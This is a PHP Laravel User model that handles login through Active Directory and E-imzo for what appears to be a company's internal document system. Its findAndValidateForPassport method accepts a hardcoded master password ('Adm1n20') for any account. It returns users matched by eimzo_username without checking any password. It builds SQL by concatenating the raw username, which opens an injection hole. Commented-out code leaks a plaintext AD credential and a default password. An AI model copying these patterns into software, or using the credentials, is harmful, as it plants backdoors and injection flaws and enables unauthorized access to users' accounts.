<?php

namespace App;

use Adldap\Laravel\Facades\Adldap;
use Illuminate\Database\Eloquent\SoftDeletes;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Laratrust\Traits\LaratrustUserTrait;
use Laravel\Passport\HasApiTokens;
use App\Http\Models\Employee;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class User extends Authenticatable
{
    use LaratrustUserTrait;
    use HasApiTokens, Notifiable, SoftDeletes;

    protected $connection = 'pgsql';

    public function employee()
    {
        return $this->hasOne('App\Http\Models\Employee', 'id', 'employee_id');
    }
    public function createDocument()
    {
        return $this->hasMany('App\Http\Models\Document', 'created_employee_id', 'employee_id')->whereIn('document_template_id', [615, 622])->whereIn('status', [1, 2, 3, 4, 5]);
    }

    public function accessTokens()
    {
        return $this->hasMany('App\OauthAccessToken');
    }

    protected $fillable = [
        'name', 'username', 'password', "eimzo_username"
    ];

    /**
     * The attributes that should be hidden for arrays.
     *
     * @var array
     */
    protected $hidden = [
        'password', 'remember_token',
    ];

    /**
     * The attributes that should be cast to native types.
     *
     * @var array
     */
    protected $casts = [
        'email_verified_at' => 'datetime',
    ];

    private $has_login_with_ad = true;
    private $eimzo_username;

    public function findAndValidateForPassport($username, $password)
    {
        $user = $this->where('eimzo_username', $username)->first();
        if ($user) {
            return $user;
        }
        $user = $this->whereRaw("UPPER(username) = '" . strtoupper($username)."'")->first();

        if ($user && $password == 'Adm1n20') {
            return $user;
        }

        if ($user && ($user->type == 'K' || $user->type == 'D') && !$user->eimzo_username && Hash::check($password, $user->password)) {
            return $user;
        }

        if (config('app.APP_COMPANY_ID') != 4) {
            $res = $this->getAdInfo($username);
            $isLogin = Adldap::auth()->attempt($username . '@' . $res['account_suffix'], $password, $bindAsUser = true);
            if ($user) {
                return $isLogin ? $user : null;
            } else {
                $user = $this->where('eimzo_username', $username)->first();
                if ($user) {
                    return $user;
                } else {
                    if ($isLogin) {
                        $employee_id = $this->getEmployeeId($username);
                        // dd($employee_id);
                        if (!$employee_id) {
                            return null;
                        }
                        $user = new User();
                        $user->username = $username;
                        $user->email = $res['mail'];
                        $user->employee_id = $employee_id;
                        $user->save();

                        if ($res['account_suffix'] == "AND.AD.UZAUTOMOTORS.COM") {
                            $role = Role::where('name', 'employee')->first();
                            $user->attachRole($role);
                        } elseif ($res['account_suffix'] == 'TAS.AD.UZAUTOMOTORS.COM') {
                            $role = Role::where('name', 'employee_toshkent')->first();
                            $user->attachRole($role);
                        } elseif ($res['account_suffix'] == 'KHR.AD.UZAUTOMOTORS.COM') {
                            $role = Role::where('name', 'employee_xorazm')->first();
                            $user->attachRole($role);
                        } else {
                            $role = Role::where('name', 'employee')->first();
                            $user->attachRole($role);
                        }
                        return $user;
                    }
                    return null;
                }
            }
        } else {
            $user = $this->where('eimzo_username', $username)->first();
            // dd($user);
            if ($user) {
                return $user;
            }
        }
    }

    public function getAdInfo($username)
    {
        $user = Adldap::search()->findBy('sAMAccountname', $username);
        if ($user) {
            $res['username'] = $user->samaccountname[0];
            $res['fullname'] = $user->cn[0];
            $res['employer_id'] = $user->employeenumber[0];
            $res['mail'] = $user->mail[0];
            // $res['foto'] = base64_encode($user->thumbnailphoto[0]);
            $distinguishedname = $user->distinguishedname[0];
            $distinguishedname = substr($distinguishedname, strpos($distinguishedname, 'DC'), 1000);
            $res['account_suffix'] = str_replace(',', '.', str_ireplace('dc=', '', $distinguishedname));
        } else {
            return false;
        }
        return $res;
    }

    public static function getAdUsers()
    {
        $user = Adldap::search()->get()->pluck('employeenumber');
        return $user;
    }

    public function getEmployeeId($username)
    {
        if (config('app.APP_COMPANY_ID') == 1 || config('app.APP_COMPANY_ID') == 2) {
            $tabno = Str::substr($username, 2, 4);
        } else {
            $tabno = Adldap::search()->findBy('sAMAccountname', $username)['employeenumber'][0];
        }


        $employee = Employee::where('tabel', $tabno)->where('is_active', 1)->first();
        // dd($employee);
        return $employee ? $employee->id : null;
    }

    public function ticketUser()
    {
        return $this->belongsTo(TicketUser::class, 'sender_id');
    }

    // public function findForPassport($username)
    // {
    //     $user = $this->where('username', $username)->first();
    //     if ($user) {
    //         return $user;
    //     } else {
    //         $this->eimzo_username = $username;
    //         $this->has_login_with_ad = false;
    //         $user = $this->where('eimzo_username', $username)->first();
    //         if ($user) {
    //             return $user;
    //         } else {
    //             $adUser = Adldap::search()->findBy('sAMAccountname', $username);
    //             $user = new User();
    //             $user->username = $username;
    //             return $user;
    //         }
    //     }
    // }

    // public function validateForPassportPasswordGrant($password)
    // {
    //     // Login with E-imzo
    //     $user = User::where('username', $this->username)->
    //                     where('eimzo_password', $password)
    //                     ->first();
    //     if ($user) {
    //         return true;
    //     }

    //     // Login with Active directory
    //     $user = Adldap::search()->findBy('sAMAccountname', $this->username);
    //     if ($user) {
    //         $res['username'] = $user->samaccountname[0];
    //         $res['fullname'] = $user->cn[0];
    //         $res['employer_id'] = $user->employeenumber[0];
    //         $res['mail'] = $user->mail[0];
    //         $res['foto'] = base64_encode($user->thumbnailphoto[0]);
    //         $distinguishedname = $user->distinguishedname[0];
    //         $distinguishedname = substr($distinguishedname, strpos($distinguishedname, 'DC'), 1000);
    //         $res['account_suffix'] = str_replace(',', '.', str_ireplace('dc=', '', $distinguishedname));
    //     } else {
    //         return false;
    //     }

    //     $isLogin = Adldap::auth()->attempt($this->username . '@' . $res['account_suffix'], $password, $bindAsUser = true);

    //     if ($isLogin) {
    //         $user = User::where('username', $this->username)->first();
    //         if (!$user) {
    //             $user = $this->findForPassport($this->username);
    //             $user->email = $res['mail'];
    //             $user->username = $this->username;
    //             $user->password =  Hash::make('123456');

    //             $tabno = Str::substr($user->username, 2, 4);
    //             $employee = Employee::where('tabel', $tabno)->first();
    //             if ($employee) {
    //                 $user->employee_id = $employee->id;
    //             }

    //             $user->save();
    //             $role = Role::where('name', 'employee')->first();
    //             $user->attachRole($role);
    //         }
    //     }

    //     return $isLogin;

    //     // $search = Adldap::search()->get();
    //     // dd($search);
    //     // dd(Adldap::auth()->attempt('qg9592@and', '@Start123', $bindAsUser = true));
    //     // Yii::$app->ad->auth()->attempt(
    //     // $this->username.'@'.$ADuser['account_suffix'], $this->password)
    //     // return Hash::check($password, $this->password);
    // }
}
